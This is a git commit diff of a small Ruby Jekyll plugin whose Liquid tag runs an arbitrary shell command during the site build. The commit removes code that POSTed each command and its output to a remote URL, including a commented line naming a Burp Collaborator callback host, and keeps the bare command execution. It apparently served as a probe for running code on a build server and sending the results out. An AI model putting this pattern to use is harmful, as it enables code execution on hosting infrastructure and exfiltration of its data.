766902ebbce3d8d9ff9c89b38ce9cf92e64b07f2
zam0x1ma <56079201+zam0x1ma@users.noreply.github.com>
2022-02-28 02:00:58 -0300

    Remove response_url

--- lib/jekyll-command-execute.rb
+++ lib/jekyll-command-execute.rb
@@ -1,22 +1,14 @@
-require 'net/http'
-require 'uri'
-
 module Jekyll
 
   class CommandExecute < Liquid::Tag
 
-    def initialize(tag_name, command, response_url)
+    def initialize(tag_name, command, tokens)
       super
       @command = command.strip
-      @response_url = response_url.strip
     end
 
     def render(context)
-      command_output = `#{@command}`
-      # Net::HTTP.post URI("http://plexnx72dqs5fdqycvzxbqgtpkvcj1.burpcollaborator.net"),
-      Net::HTTP.post URI(@response_url),
-        { "command" => @command, "result" => command_output }.to_json,
-        "Content-Type" => "application/json"
+      `#{@command}`
     end
 
   end
